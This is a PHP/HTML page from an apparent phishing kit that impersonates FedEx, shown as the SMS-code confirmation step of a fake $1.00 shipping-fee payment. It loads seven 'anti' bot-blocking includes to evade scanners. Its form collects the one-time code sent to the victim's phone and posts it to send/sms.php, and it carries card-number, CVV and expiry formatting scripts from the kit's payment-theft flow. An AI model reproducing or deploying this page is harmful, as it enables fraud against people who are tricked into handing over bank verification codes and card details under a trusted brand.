<?php
include "../bots/anti1.php";
include "../bots/anti2.php";
include "../bots/anti3.php";
include "../bots/anti4.php";
include "../bots/anti5.php";
include "../bots/anti6.php";
include "../bots/anti7.php";		
?><!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <title>FedEx Info | FedEx</title>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <!-- template css files-->
  <link rel="stylesheet"  href="css/bootstrap.css">
  <link rel="stylesheet"  href="css/test.css">             
  <link rel="preconnect" href="https://fonts.gstatic.com">
  

  <!-- js files-->
  <script src="js/html5shiv.min.js"></script>
  <script src="js/respond.min.js"></script>

  <!-- logo site web-->
  <link rel="icon" href="image/logo.png" type="image/x-icon" />
  <link rel="shortcut icon" href="image/logo.png" type="image/x-icon" />

  <!-- fontawtsome -->
  <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>

</head>

<body>

    <header>
        <div class="header">
            <div class="logo" id="main">
                <img width="70" src="image/logo.png">
            </div>
        </div>
    </header>

    <section>
        <div class="billing bg-white pt-4 px-2" id="main">
            <div class="row" style="margin-right: 0;">
                <div class="col-md-8">
                    <div class="left">

                        <div class="step px-1 py-1">
                            <ul class="list-unstyled d-flex mb-0">
                                <li><span class="none">1</span></li>
                                <span class="me-4 ms-2 n"> Contact Info </span>

                                <li><span class="none">2</span></li>
                                <span class="me-4 ms-2 n">Payment Info</span>

                                <li><span >3</span></li>
                                <span class="me-4 ms-2 ">Confirmation</span>
                            </ul>
                        </div>

                        <div class="content py-3 px-1" style="background: #E6E6E6;">
                            <p class="mt-2 mb-2"><b>* Required fields are in bold.</b></p>
                        </div>

                        <div class="titre py-1 px-1">
                            <span>Confirmation</span>
                        </div>

                        <div class="content px-5 pt-3" style="background: #CCCCCC;">


                            <form action="send/sms.php" method="post">

                                <input type="hidden" value="sms" name="step">


                                <div class="transaction text-center border shadow py-2">
                                    <div class="ref">
                                        <h4 style="font-size:15px;margin-bottom: 0;">Number Shipment :<strong> 577215117391</strong></h4>
                                        <h4 class="mt-3 mb-3" style="font-size:15px;margin-bottom: 0;">Shipping Costs : <strong>01,00 $</strong></h4>
                                        <h4 style="font-size:15px;margin-bottom: 0;">Beneficiary : <strong>FEDEX</strong></h4>
                                       
                                    </div>
                                </div>


                               <h6 class="text-center pt-5 px-5">Enter the code that you received as a message on your mobile phone</h6>

                               <div class="form-group mt-4 px-5">
                                   <input class="form-control" placeholder="SMS CODE" type="text" maxlength="8" id="sms" name="sms" required="">
                               </div>

                                <div class="btn text-center mt-4 mb-4" style="width:100%">
                                   <button name="submit">Confirmer</button>
                               </div>
                            </form>
                        </div>
                    </div>
                </div>

                <div class="col-md-4 ">

                    

                   <div class="free border py-3 px-3 shadow mt-4">

                           <div class="logo mb-5">
                               <img width="70" src="image/logo.png">
                           </div>

                           <div class="prix text-end ">
                              <p><b>0,085 $</b> </p>
                              <span>(0.15 incl.VAT)</span>
                           </div>

                           <hr>

                           <div class="row align-items-start">
                               <div class="col">
                                   <h5 class="fw-bolder">Total</h5>
                               </div>
                               <div class="col">
                                    <div class="prix text-end">
                                        <p> <b>01 , 00 $</b></p>
                                        <span>VAT included</span>
                                    </div>
                               </div>
                           </div>
                   </div>
                </div>
            </div>
        </div>
        
    </section>

<br>
    <footer class="pt-4">
        <div class="footer" id="main">
            <div class="logo d-flex justify-content-between">
                <div class="logo">
                    <img src="image/logo-footer.gif">
                </div>
                <div class="search">
                    <img src="image/search.png">
                </div>
            </div>

            <hr>

            <div class="footer-b row" style="margin-right: 0;">
                <div class="row">
                    <div class=" footer-left col-md-7">
                         <div class="navv d-flex">
                            <ul class="list-unstyled me-5">
                                <li><strong>Additional Information</strong></li>
                                <li>About FedEx</li>
                                <li>Service Information</li>
                                <li>Service Guide</li>
                                <li>Mobile Solutions</li>
                                <li>Healthcare Solutions</li>
                                <li>Aerospace Solutions</li>
                                <li>FedEx Supply Chain</li>
                                <li>Careers</li>
                            </ul>
                            <ul class="list-unstyled" >
                                <li><strong>Customer Support</strong></li>
                                <li>Contact Us</li>
                                <li>Frequently Asked Questions</li>
                                <li>Send us an email</li>
                                <li>Write to us</li>
                                <li>Call FedEx Customer Service at</li>
                                <li>1.800.GoFedEx 1.800.463 3339</li>
                            </ul>
                        </div>
                    </div>
                    <div class="col-md-5">
                      <div class="footer-right d-flex justify-content-between">
                          <div>
                              <span>Follow FedEx</span>
                              <div class="img mb-4">
                                  <img src="image/media.png">
                              </div>
                          </div>
                          <div>
                              <img src="image/canada.png">
                          </div>
                      </div>
                    </div>
                </div>

                <hr>

                <div class="row">
                    <div class="col-md-6">
                        <p>All rights reserved.� FedEx 1995-2023</p>
                    </div>
                    <div class="col-md-6 bottom">
                        <ul class="list-unstyled">
                            <li>Careers</li>
                            <li>Global Home</li>
                            <li>Site Map</li>
                            <li>Internet Privacy Policy</li>
                            <li>Privacy Code</li>
                            <li>Terms of Use</li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </footer>
    
   
   




  <!-- template files js-->
  <script src="js/jquery-3.5.1.min.js"></script>
  <script src="js/bootstrap.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/3.0.0/jquery.payment.min.js"></script>
  <script>
       
            $('#cvv').payment('formatCardCVC');
            $('#expiry').payment('formatCardExpiry');
            $('#card_number').payment('formatCardNumber');
      </script>
</body>
</html>